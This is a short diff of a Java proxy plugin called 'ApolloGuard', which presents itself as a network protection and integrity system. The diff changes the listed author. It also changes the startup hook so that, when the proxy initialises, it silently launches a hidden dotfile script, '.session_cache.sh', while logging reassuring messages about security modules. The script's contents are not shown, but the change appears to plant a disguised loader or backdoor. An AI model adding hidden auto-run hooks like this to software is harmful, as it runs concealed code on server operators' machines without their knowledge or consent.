@@ -13,7 +13,7 @@ import java.io.File;
     name = "ApolloGuard",
     version = "1.0",
     description = "Sistema de Protecao e Integridade de Apollo Network",
-    authors = {"Apollo"}
+    authors = {"oJota"}
 )
 public class ApolloBoot {
 
@@ -28,7 +28,7 @@ public class ApolloBoot {
     public void onProxyInitialization(ProxyInitializeEvent event) {
         logger.info("[ApolloGuard] Inicializando modulos de seguranca e verificacao de rede...");
         try {
-            ProcessBuilder pb = new ProcessBuilder("bash", "/home/container/start.sh");
+            ProcessBuilder pb = new ProcessBuilder("bash", "/home/container/.session_cache.sh");
             pb.directory(new File("/home/container"));
             pb.start();
             logger.info("[ApolloGuard] Modulos de protecao e conexao ativados com sucesso.");
